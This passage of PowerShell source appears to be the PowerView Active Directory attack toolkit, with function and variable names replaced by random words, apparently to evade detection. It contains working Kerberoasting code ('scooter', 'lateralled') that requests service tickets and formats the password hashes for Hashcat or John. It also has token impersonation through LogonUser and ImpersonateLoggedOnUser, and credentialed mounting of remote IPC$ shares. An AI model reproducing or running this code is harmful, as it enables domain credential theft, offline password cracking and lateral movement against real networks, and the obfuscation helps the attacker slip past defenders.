                    'S-1-5-7'       { 'Anonymous' }
                    'S-1-5-8'       { 'Proxy' }
                    'S-1-5-9'       { 'Enterprise Domain Controllers' }
                    'S-1-5-10'      { 'Principal Self' }
                    'S-1-5-11'      { 'Authenticated Users' }
                    'S-1-5-12'      { 'Restricted Code' }
                    'S-1-5-13'      { 'Terminal Server Users' }
                    'S-1-5-14'      { 'Remote Interactive Logon' }
                    'S-1-5-15'      { 'This Organization ' }
                    'S-1-5-17'      { 'This Organization ' }
                    'S-1-5-18'      { 'Local System' }
                    'S-1-5-19'      { 'NT Authority' }
                    'S-1-5-20'      { 'NT Authority' }
                    'S-1-5-80-0'    { 'All Services ' }
                    'S-1-5-32-544'  { 'BUILTIN\Administrators' }
                    'S-1-5-32-545'  { 'BUILTIN\Users' }
                    'S-1-5-32-546'  { 'BUILTIN\Guests' }
                    'S-1-5-32-547'  { 'BUILTIN\Power Users' }
                    'S-1-5-32-548'  { 'BUILTIN\Account Operators' }
                    'S-1-5-32-549'  { 'BUILTIN\Server Operators' }
                    'S-1-5-32-550'  { 'BUILTIN\Print Operators' }
                    'S-1-5-32-551'  { 'BUILTIN\Backup Operators' }
                    'S-1-5-32-552'  { 'BUILTIN\Replicators' }
                    'S-1-5-32-554'  { 'BUILTIN\Pre-Windows 2000 Compatible Access' }
                    'S-1-5-32-555'  { 'BUILTIN\Remote Desktop Users' }
                    'S-1-5-32-556'  { 'BUILTIN\Network Configuration Operators' }
                    'S-1-5-32-557'  { 'BUILTIN\Incoming Forest Trust Builders' }
                    'S-1-5-32-558'  { 'BUILTIN\Performance Monitor Users' }
                    'S-1-5-32-559'  { 'BUILTIN\Performance Log Users' }
                    'S-1-5-32-560'  { 'BUILTIN\Windows Authorization Access Group' }
                    'S-1-5-32-561'  { 'BUILTIN\Terminal Server License Servers' }
                    'S-1-5-32-562'  { 'BUILTIN\Distributed COM Users' }
                    'S-1-5-32-569'  { 'BUILTIN\Cryptographic Operators' }
                    'S-1-5-32-573'  { 'BUILTIN\Event Log Readers' }
                    'S-1-5-32-574'  { 'BUILTIN\Certificate Service DCOM Access' }
                    'S-1-5-32-575'  { 'BUILTIN\RDS Remote Access Servers' }
                    'S-1-5-32-576'  { 'BUILTIN\RDS Endpoint Servers' }
                    'S-1-5-32-577'  { 'BUILTIN\RDS Management Servers' }
                    'S-1-5-32-578'  { 'BUILTIN\Hyper-V Administrators' }
                    'S-1-5-32-579'  { 'BUILTIN\Access Control Assistance Operators' }
                    'S-1-5-32-580'  { 'BUILTIN\Access Control Assistance Operators' }
                    Default {
                        oared -Identity $KNzOOYde99 @ADNameArguments
                    }
                }
            }
            catch {
                Write-Verbose "[recollection] Error converting SID '$KNzOOYde99' : $_"
            }
        }
    }
}


function oared {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name', 'ObjectName')]
        [String[]]
        $lmPsrtYT99,

        [String]
        [ValidateSet('DN', 'Canonical', 'NT4', 'Display', 'DomainSimple', 'EnterpriseSimple', 'GUID', 'Unknown', 'UPN', 'CanonicalEx', 'SPN')]
        $SINQyaaP99,

        [ValidateNotNullOrEmpty()]
        [String]
        $JXWXuoyG99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $tqOJuvTN99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $gWgTUeEU99 = @{
            'DN'                =   1  # CN=Phineas Flynn,OU=Engineers,DC=fabrikam,DC=com
            'Canonical'         =   2  # fabrikam.com/Engineers/Phineas Flynn
            'NT4'               =   3  # fabrikam\pflynn
            'Display'           =   4  # pflynn
            'DomainSimple'      =   5  # pflynn@fabrikam.com
            'EnterpriseSimple'  =   6  # pflynn@fabrikam.com
            'GUID'              =   7  # {95ee9fff-3436-11d1-b2b0-d15ae3ac8436}
            'Unknown'           =   8  # unknown type - let the server do translation
            'UPN'               =   9  # pflynn@fabrikam.com
            'CanonicalEx'       =   10 # fabrikam.com/Users/Phineas Flynn
            'SPN'               =   11 # HTTP/kairomac.contoso.com
            'SID'               =   12 # S-1-5-21-12986231-600641547-709122288-57999
        }

        function Invoke-Method([__ComObject] $Object, [String] $BXxAvYPV99, $nnuooEDS99) {
            $MWaxCMux99 = $Null
            $MWaxCMux99 = $Object.GetType().InvokeMember($BXxAvYPV99, 'InvokeMethod', $NULL, $Object, $nnuooEDS99)
            Write-Output $MWaxCMux99
        }

        function Get-Property([__ComObject] $Object, [String] $MywCdUSF99) {
            $Object.GetType().InvokeMember($MywCdUSF99, 'GetProperty', $NULL, $Object, $NULL)
        }

        function Set-Property([__ComObject] $Object, [String] $MywCdUSF99, $nnuooEDS99) {
            [Void] $Object.GetType().InvokeMember($MywCdUSF99, 'SetProperty', $NULL, $Object, $nnuooEDS99)
        }

        if ($PSBoundParameters['Server']) {
            $WcYoWlot99 = 2
            $RRDmPLmi99 = $tqOJuvTN99
        }
        elseif ($PSBoundParameters['Domain']) {
            $WcYoWlot99 = 1
            $RRDmPLmi99 = $JXWXuoyG99
        }
        elseif ($PSBoundParameters['Credential']) {
            $Cred = $tYWiEqAT99.GetNetworkCredential()
            $WcYoWlot99 = 1
            $RRDmPLmi99 = $Cred.Domain
        }
        else {
            $WcYoWlot99 = 3
            $RRDmPLmi99 = $Null
        }
    }

    PROCESS {
        ForEach ($IaoZaZbm99 in $lmPsrtYT99) {
            if (-not $PSBoundParameters['OutputType']) {
                if ($IaoZaZbm99 -match "^[A-Za-z]+\\[A-Za-z ]+") {
                    $HahOnTlL99 = $gWgTUeEU99['DomainSimple']
                }
                else {
                    $HahOnTlL99 = $gWgTUeEU99['NT4']
                }
            }
            else {
                $HahOnTlL99 = $gWgTUeEU99[$SINQyaaP99]
            }

            $gTotCnDm99 = New-Object -ComObject NameTranslate

            if ($PSBoundParameters['Credential']) {
                try {
                    $Cred = $tYWiEqAT99.GetNetworkCredential()

                    Invoke-Method $gTotCnDm99 'InitEx' (
                        $WcYoWlot99,
                        $RRDmPLmi99,
                        $Cred.UserName,
                        $Cred.Domain,
                        $Cred.Password
                    )
                }
                catch {
                    Write-Verbose "[oared] Error initializing translation for '$lmPsrtYT99' using alternate credentials : $_"
                }
            }
            else {
                try {
                    $Null = Invoke-Method $gTotCnDm99 'Init' (
                        $WcYoWlot99,
                        $RRDmPLmi99
                    )
                }
                catch {
                    Write-Verbose "[oared] Error initializing translation for '$lmPsrtYT99' : $_"
                }
            }

            Set-Property $gTotCnDm99 'ChaseReferral' (0x60)

            try {
                $Null = Invoke-Method $gTotCnDm99 'Set' (8, $IaoZaZbm99)
                Invoke-Method $gTotCnDm99 'Get' ($HahOnTlL99)
            }
            catch [System.Management.Automation.MethodInvocationException] {
                Write-Verbose "[oared] Error translating '$IaoZaZbm99' : $($_.Exception.InnerException.Message)"
            }
        }
    }
}


function visible {

    [OutputType('System.Collections.Specialized.OrderedDictionary')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('UAC', 'useraccountcontrol')]
        [Int]
        $Value,

        [Switch]
        $opOaaNEv99
    )

    BEGIN {
        $QCKwmpDL99 = New-Object System.Collections.Specialized.OrderedDictionary
        $QCKwmpDL99.Add("SCRIPT", 1)
        $QCKwmpDL99.Add("ACCOUNTDISABLE", 2)
        $QCKwmpDL99.Add("HOMEDIR_REQUIRED", 8)
        $QCKwmpDL99.Add("LOCKOUT", 16)
        $QCKwmpDL99.Add("PASSWD_NOTREQD", 32)
        $QCKwmpDL99.Add("PASSWD_CANT_CHANGE", 64)
        $QCKwmpDL99.Add("ENCRYPTED_TEXT_PWD_ALLOWED", 128)
        $QCKwmpDL99.Add("TEMP_DUPLICATE_ACCOUNT", 256)
        $QCKwmpDL99.Add("NORMAL_ACCOUNT", 512)
        $QCKwmpDL99.Add("INTERDOMAIN_TRUST_ACCOUNT", 2048)
        $QCKwmpDL99.Add("WORKSTATION_TRUST_ACCOUNT", 4096)
        $QCKwmpDL99.Add("SERVER_TRUST_ACCOUNT", 8192)
        $QCKwmpDL99.Add("DONT_EXPIRE_PASSWORD", 65536)
        $QCKwmpDL99.Add("MNS_LOGON_ACCOUNT", 131072)
        $QCKwmpDL99.Add("SMARTCARD_REQUIRED", 262144)
        $QCKwmpDL99.Add("TRUSTED_FOR_DELEGATION", 524288)
        $QCKwmpDL99.Add("NOT_DELEGATED", 1048576)
        $QCKwmpDL99.Add("USE_DES_KEY_ONLY", 2097152)
        $QCKwmpDL99.Add("DONT_REQ_PREAUTH", 4194304)
        $QCKwmpDL99.Add("PASSWORD_EXPIRED", 8388608)
        $QCKwmpDL99.Add("TRUSTED_TO_AUTH_FOR_DELEGATION", 16777216)
        $QCKwmpDL99.Add("PARTIAL_SECRETS_ACCOUNT", 67108864)
    }

    PROCESS {
        $laTNGkex99 = New-Object System.Collections.Specialized.OrderedDictionary

        if ($opOaaNEv99) {
            ForEach ($pLCGACce99 in $QCKwmpDL99.GetEnumerator()) {
                if ( ($Value -band $pLCGACce99.Value) -eq $pLCGACce99.Value) {
                    $laTNGkex99.Add($pLCGACce99.Name, "$($pLCGACce99.Value)+")
                }
                else {
                    $laTNGkex99.Add($pLCGACce99.Name, "$($pLCGACce99.Value)")
                }
            }
        }
        else {
            ForEach ($pLCGACce99 in $QCKwmpDL99.GetEnumerator()) {
                if ( ($Value -band $pLCGACce99.Value) -eq $pLCGACce99.Value) {
                    $laTNGkex99.Add($pLCGACce99.Name, "$($pLCGACce99.Value)")
                }
            }
        }
        $laTNGkex99
    }
}


function vignetting {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $lmPsrtYT99,

        [ValidateNotNullOrEmpty()]
        [String]
        $JXWXuoyG99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty
    )

    Add-Type -AssemblyName System.DirectoryServices.AccountManagement

    try {
        if ($PSBoundParameters['Domain'] -or ($lmPsrtYT99 -match '.+\\.+')) {
            if ($lmPsrtYT99 -match '.+\\.+') {
                $HvlUElew99 = $lmPsrtYT99 | oared -OutputType Canonical
                if ($HvlUElew99) {
                    $skZuxZiT99 = $HvlUElew99.SubString(0, $HvlUElew99.IndexOf('/'))
                    $qZDviFNa99 = $lmPsrtYT99.Split('\')[1]
                    Write-Verbose "[vignetting] Binding to domain '$skZuxZiT99'"
                }
            }
            else {
                $qZDviFNa99 = $lmPsrtYT99
                Write-Verbose "[vignetting] Binding to domain '$JXWXuoyG99'"
                $skZuxZiT99 = $JXWXuoyG99
            }

            if ($PSBoundParameters['Credential']) {
                Write-Verbose '[vignetting] Using alternate credentials'
                $mLYECpfd99 = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $skZuxZiT99, $tYWiEqAT99.UserName, $tYWiEqAT99.GetNetworkCredential().Password)
            }
            else {
                $mLYECpfd99 = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $skZuxZiT99)
            }
        }
        else {
            if ($PSBoundParameters['Credential']) {
                Write-Verbose '[vignetting] Using alternate credentials'
                $wRSZwPqV99 = foretasted | Select-Object -ExpandProperty Name
                $mLYECpfd99 = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $wRSZwPqV99, $tYWiEqAT99.UserName, $tYWiEqAT99.GetNetworkCredential().Password)
            }
            else {
                $mLYECpfd99 = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain)
            }
            $qZDviFNa99 = $lmPsrtYT99
        }

        $Out = New-Object PSObject
        $Out | Add-Member Noteproperty 'Context' $mLYECpfd99
        $Out | Add-Member Noteproperty 'Identity' $qZDviFNa99
        $Out
    }
    catch {
        Write-Warning "[vignetting] Error creating binding for object ('$lmPsrtYT99') context : $_"
    }
}


function Kamehameha {

    [CmdletBinding(DefaultParameterSetName = 'ComputerName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ComputerName', ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $tdrFALUN99,

        [Parameter(Position = 0, ParameterSetName = 'Path', Mandatory = $True)]
        [ValidatePattern('\\\\.*\\.*')]
        [String[]]
        $Path,

        [Parameter(Mandatory = $True)]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99
    )

    BEGIN {
        $qsyDmeqP99 = [Activator]::CreateInstance($QIIICAeE99)
        $qsyDmeqP99.dwType = 1
    }

    PROCESS {
        $Paths = @()
        if ($PSBoundParameters['ComputerName']) {
            ForEach ($bvgoxpSV99 in $tdrFALUN99) {
                $bvgoxpSV99 = $bvgoxpSV99.Trim('\')
                $Paths += ,"\\$bvgoxpSV99\IPC$"
            }
        }
        else {
            $Paths += ,$Path
        }

        ForEach ($HopMlfhE99 in $Paths) {
            $qsyDmeqP99.lpRemoteName = $HopMlfhE99
            Write-Verbose "[Kamehameha] Attempting to mount: $HopMlfhE99"

            $uBmcbTpF99 = $Mpr::WNetAddConnection2W($qsyDmeqP99, $tYWiEqAT99.GetNetworkCredential().Password, $tYWiEqAT99.UserName, 4)

            if ($uBmcbTpF99 -eq 0) {
                Write-Verbose "$HopMlfhE99 successfully mounted"
            }
            else {
                Throw "[Kamehameha] error mounting $HopMlfhE99 : $(([ComponentModel.Win32Exception]$uBmcbTpF99).Message)"
            }
        }
    }
}


function refrigerants {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding(DefaultParameterSetName = 'ComputerName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ComputerName', ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $tdrFALUN99,

        [Parameter(Position = 0, ParameterSetName = 'Path', Mandatory = $True)]
        [ValidatePattern('\\\\.*\\.*')]
        [String[]]
        $Path
    )

    PROCESS {
        $Paths = @()
        if ($PSBoundParameters['ComputerName']) {
            ForEach ($bvgoxpSV99 in $tdrFALUN99) {
                $bvgoxpSV99 = $bvgoxpSV99.Trim('\')
                $Paths += ,"\\$bvgoxpSV99\IPC$"
            }
        }
        else {
            $Paths += ,$Path
        }

        ForEach ($HopMlfhE99 in $Paths) {
            Write-Verbose "[refrigerants] Attempting to unmount: $HopMlfhE99"
            $uBmcbTpF99 = $Mpr::WNetCancelConnection2($HopMlfhE99, 0, $True)

            if ($uBmcbTpF99 -eq 0) {
                Write-Verbose "$HopMlfhE99 successfully ummounted"
            }
            else {
                Throw "[refrigerants] error unmounting $HopMlfhE99 : $(([ComponentModel.Win32Exception]$uBmcbTpF99).Message)"
            }
        }
    }
}


function privets {

    [OutputType([IntPtr])]
    [CmdletBinding(DefaultParameterSetName = 'Credential')]
    Param(
        [Parameter(Mandatory = $True, ParameterSetName = 'Credential')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99,

        [Parameter(Mandatory = $True, ParameterSetName = 'TokenHandle')]
        [ValidateNotNull()]
        [IntPtr]
        $ZDPszabE99,

        [Switch]
        $Quiet
    )

    if (([System.Threading.Thread]::CurrentThread.GetApartmentState() -ne 'STA') -and (-not $PSBoundParameters['Quiet'])) {
        Write-Warning "[privets] powershell.exe is not currently in a single-threaded apartment state, token impersonation may not work."
    }

    if ($PSBoundParameters['TokenHandle']) {
        $ORIKhTvZ99 = $ZDPszabE99
    }
    else {
        $ORIKhTvZ99 = [IntPtr]::Zero
        $HLRWQnTz99 = $tYWiEqAT99.GetNetworkCredential()
        $thGIxDFy99 = $HLRWQnTz99.Domain
        $OvZZajfU99 = $HLRWQnTz99.UserName
        Write-Warning "[privets] Executing LogonUser() with user: $($thGIxDFy99)\$($OvZZajfU99)"

        $uBmcbTpF99 = $CtIsAwlU99::LogonUser($OvZZajfU99, $thGIxDFy99, $HLRWQnTz99.Password, 9, 3, [ref]$ORIKhTvZ99);$gFfKoNOj99 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();

        if (-not $uBmcbTpF99) {
            throw "[privets] LogonUser() Error: $(([ComponentModel.Win32Exception] $gFfKoNOj99).Message)"
        }
    }

    $uBmcbTpF99 = $CtIsAwlU99::ImpersonateLoggedOnUser($ORIKhTvZ99)

    if (-not $uBmcbTpF99) {
        throw "[privets] ImpersonateLoggedOnUser() Error: $(([ComponentModel.Win32Exception] $gFfKoNOj99).Message)"
    }

    Write-Verbose "[privets] Alternate credentials successfully impersonated"
    $ORIKhTvZ99
}


function potato {

    [CmdletBinding()]
    Param(
        [ValidateNotNull()]
        [IntPtr]
        $ZDPszabE99
    )

    if ($PSBoundParameters['TokenHandle']) {
        Write-Warning "[potato] Reverting token impersonation and closing LogonUser() token handle"
        $uBmcbTpF99 = $Kernel32::CloseHandle($ZDPszabE99)
    }

    $uBmcbTpF99 = $CtIsAwlU99::RevertToSelf();$gFfKoNOj99 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();

    if (-not $uBmcbTpF99) {
        throw "[potato] RevertToSelf() Error: $(([ComponentModel.Win32Exception] $gFfKoNOj99).Message)"
    }

    Write-Verbose "[potato] Token impersonation successfully reverted"
}


function scooter {

    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding(DefaultParameterSetName = 'RawSPN')]
    Param (
        [Parameter(Position = 0, ParameterSetName = 'RawSPN', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidatePattern('.*/.*')]
        [Alias('ServicePrincipalName')]
        [String[]]
        $SPN,

        [Parameter(Position = 0, ParameterSetName = 'User', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateScript({ $_.PSObject.TypeNames[0] -eq 'PowerView.User' })]
        [Object[]]
        $User,

        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $fwQIbUeP99 = 'Hashcat',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $Null = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')

        if ($PSBoundParameters['Credential']) {
            $KqozIDmd99 = privets -Credential $tYWiEqAT99
        }
    }

    PROCESS {
        if ($PSBoundParameters['User']) {
            $yWVPvPZJ99 = $User
        }
        else {
            $yWVPvPZJ99 = $SPN
        }

        ForEach ($Object in $yWVPvPZJ99) {
            if ($PSBoundParameters['User']) {
                $yqvgTeVH99 = $Object.ServicePrincipalName
                $dKvoAcKU99 = $Object.SamAccountName
                $NfCnbvSv99 = $Object.DistinguishedName
            }
            else {
                $yqvgTeVH99 = $Object
                $dKvoAcKU99 = 'UNKNOWN'
                $NfCnbvSv99 = 'UNKNOWN'
            }

            if ($yqvgTeVH99 -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                $yqvgTeVH99 = $yqvgTeVH99[0]
            }

            try {
                $UzhEOCJP99 = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $yqvgTeVH99
            }
            catch {
                Write-Warning "[scooter] Error requesting ticket for SPN '$yqvgTeVH99' from user '$NfCnbvSv99' : $_"
            }
            if ($UzhEOCJP99) {
                $NFIxVtLx99 = $UzhEOCJP99.GetRequest()
            }
            if ($NFIxVtLx99) {
                $Out = New-Object PSObject

                $JTxGBKJf99 = [System.BitConverter]::ToString($NFIxVtLx99) -replace '-'

                $Out | Add-Member Noteproperty 'SamAccountName' $dKvoAcKU99
                $Out | Add-Member Noteproperty 'DistinguishedName' $NfCnbvSv99
                $Out | Add-Member Noteproperty 'ServicePrincipalName' $UzhEOCJP99.ServicePrincipalName

                if($JTxGBKJf99 -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
                    $Etype = [Convert]::ToByte( $Matches.EtypeLen, 16 )
                    $ObpVNHom99 = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
                    $ZaOtdRfz99 = $Matches.DataToEnd.Substring(0,$ObpVNHom99*2)

                    if($Matches.DataToEnd.Substring($ObpVNHom99*2, 4) -ne 'A482') {
                        Write-Warning "Error parsing ciphertext for the SPN  $($UzhEOCJP99.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                        $Hash = $null
                        $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($NFIxVtLx99).Replace('-',''))
                    } else {
                        $Hash = "$($ZaOtdRfz99.Substring(0,32))`$$($ZaOtdRfz99.Substring(32))"
                        $Out | Add-Member Noteproperty 'TicketByteHexStream' $null
                    }
                } else {
                    Write-Warning "Unable to parse ticket structure for the SPN  $($UzhEOCJP99.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                    $Hash = $null
                    $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($NFIxVtLx99).Replace('-',''))
                }

                if($Hash) {
                    if ($fwQIbUeP99 -match 'John') {
                        $LABIcggy99 = "`$hLdlUhCG99`$$($UzhEOCJP99.ServicePrincipalName):$Hash"
                    }
                    else {
                        if ($NfCnbvSv99 -ne 'UNKNOWN') {
                            $thGIxDFy99 = $NfCnbvSv99.SubString($NfCnbvSv99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                        else {
                            $thGIxDFy99 = 'UNKNOWN'
                        }

                        $LABIcggy99 = "`$hLdlUhCG99`$$($Etype)`$*$dKvoAcKU99`$$thGIxDFy99`$$($UzhEOCJP99.ServicePrincipalName)*`$$Hash"
                    }
                    $Out | Add-Member Noteproperty 'Hash' $LABIcggy99
                }

                $Out.PSObject.TypeNames.Insert(0, 'PowerView.SPNTicket')
                $Out
            }
        }
    }

    END {
        if ($KqozIDmd99) {
            potato -TokenHandle $KqozIDmd99
        }
    }
}


function lateralled {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $lmPsrtYT99,

        [ValidateNotNullOrEmpty()]
        [String]
        $JXWXuoyG99,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $NzjfVMfT99,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $pQbfmzwr99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $tqOJuvTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $lGlQEcNF99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ixOvvLXO99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $EQlXfKFO99,

        [Switch]
        $adpABMuf99,

        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $fwQIbUeP99 = 'Hashcat',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $HYrlZdwg99 = @{
            'SPN' = $True
            'Properties' = 'samaccountname,distinguishedname,serviceprincipalname'
        }
        if ($PSBoundParameters['Domain']) { $HYrlZdwg99['Domain'] = $JXWXuoyG99 }
        if ($PSBoundParameters['LDAPFilter']) { $HYrlZdwg99['LDAPFilter'] = $NzjfVMfT99 }
        if ($PSBoundParameters['SearchBase']) { $HYrlZdwg99['SearchBase'] = $pQbfmzwr99 }
        if ($PSBoundParameters['Server']) { $HYrlZdwg99['Server'] = $tqOJuvTN99 }
        if ($PSBoundParameters['SearchScope']) { $HYrlZdwg99['SearchScope'] = $lGlQEcNF99 }
        if ($PSBoundParameters['ResultPageSize']) { $HYrlZdwg99['ResultPageSize'] = $ixOvvLXO99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $HYrlZdwg99['ServerTimeLimit'] = $EQlXfKFO99 }
        if ($PSBoundParameters['Tombstone']) { $HYrlZdwg99['Tombstone'] = $adpABMuf99 }
        if ($PSBoundParameters['Credential']) { $HYrlZdwg99['Credential'] = $tYWiEqAT99 }

        if ($PSBoundParameters['Credential']) {
            $KqozIDmd99 = privets -Credential $tYWiEqAT99
        }
    }

    PROCESS {
        if ($PSBoundParameters['Identity']) { $HYrlZdwg99['Identity'] = $lmPsrtYT99 }
        asseverate @UserSearcherArguments | Where-Object {$_.samaccountname -ne 'krbtgt'} | scooter -OutputFormat $fwQIbUeP99
    }

    END {
        if ($KqozIDmd99) {
            potato -TokenHandle $KqozIDmd99
        }
    }
}


function downgrading {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FileACL')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('FullName')]
        [String[]]
        $Path,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {

        function industrializing {
            [CmdletBinding()]
            Param(
                [Int]
                $FSR
            )

            $AccessMask = @{
                [uint32]'0x80000000' = 'GenericRead'
                [uint32]'0x40000000' = 'GenericWrite'
                [uint32]'0x20000000' = 'GenericExecute'
                [uint32]'0x10000000' = 'GenericAll'
                [uint32]'0x02000000' = 'MaximumAllowed'
                [uint32]'0x01000000' = 'AccessSystemSecurity'
                [uint32]'0x00100000' = 'Synchronize'
                [uint32]'0x00080000' = 'WriteOwner'
                [uint32]'0x00040000' = 'WriteDAC'
                [uint32]'0x00020000' = 'ReadControl'
                [uint32]'0x00010000' = 'Delete'
                [uint32]'0x00000100' = 'WriteAttributes'
                [uint32]'0x00000080' = 'ReadAttributes'
                [uint32]'0x00000040' = 'DeleteChild'
                [uint32]'0x00000020' = 'Execute/Traverse'
                [uint32]'0x00000010' = 'WriteExtendedAttributes'
                [uint32]'0x00000008' = 'ReadExtendedAttributes'
                [uint32]'0x00000004' = 'AppendData/AddSubdirectory'
                [uint32]'0x00000002' = 'WriteData/AddFile'
                [uint32]'0x00000001' = 'ReadData/ListDirectory'
            }

            $PdjjZtze99 = @{
                [uint32]'0x1f01ff' = 'FullControl'
                [uint32]'0x0301bf' = 'Modify'
                [uint32]'0x0200a9' = 'ReadAndExecute'
                [uint32]'0x02019f' = 'ReadAndWrite'
                [uint32]'0x020089' = 'Read'
                [uint32]'0x000116' = 'Write'
            }

            $QidjSIJq99 = @()

            $QidjSIJq99 += $PdjjZtze99.Keys | ForEach-Object {
                              if (($FSR -band $_) -eq $_) {
                                $PdjjZtze99[$_]
                                $FSR = $FSR -band (-not $_)
                              }
                            }

            $QidjSIJq99 += $AccessMask.Keys | Where-Object { $FSR -band $_ } | ForEach-Object { $AccessMask[$_] }
            ($QidjSIJq99 | Where-Object {$_}) -join ','
        }

        $lCBnsyFH99 = @{}
        if ($PSBoundParameters['Credential']) { $lCBnsyFH99['Credential'] = $tYWiEqAT99 }

        $cdhpdjRy99 = @{}
    }

    PROCESS {
        ForEach ($HopMlfhE99 in $Path) {
            try {
                if (($HopMlfhE99 -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                    $PYpySBmA99 = (New-Object System.Uri($HopMlfhE99)).Host
                    if (-not $cdhpdjRy99[$PYpySBmA99]) {
                        Kamehameha -ComputerName $PYpySBmA99 -Credential $tYWiEqAT99
                        $cdhpdjRy99[$PYpySBmA99] = $True
                    }
                }

                $ACL = Get-Acl -Path $HopMlfhE99

                $ACL.GetAccessRules($True, $True, [System.Security.Principal.SecurityIdentifier]) | ForEach-Object {
                    $SID = $_.IdentityReference.Value
                    $Name = recollection -ObjectSID $SID @ConvertArguments

                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'Path' $HopMlfhE99
                    $Out | Add-Member Noteproperty 'FileSystemRights' (industrializing -FSR $_.FileSystemRights.value__)
                    $Out | Add-Member Noteproperty 'IdentityReference' $Name
                    $Out | Add-Member Noteproperty 'IdentitySID' $SID
                    $Out | Add-Member Noteproperty 'AccessControlType' $_.AccessControlType
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.FileACL')
                    $Out
                }
            }
            catch {
                Write-Verbose "[downgrading] error: $_"
            }
        }
    }

    END {
        $cdhpdjRy99.Keys | refrigerants
    }
}


function Jagger {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        $hqDcSuel99
    )

    $gAyJrOjX99 = @{}

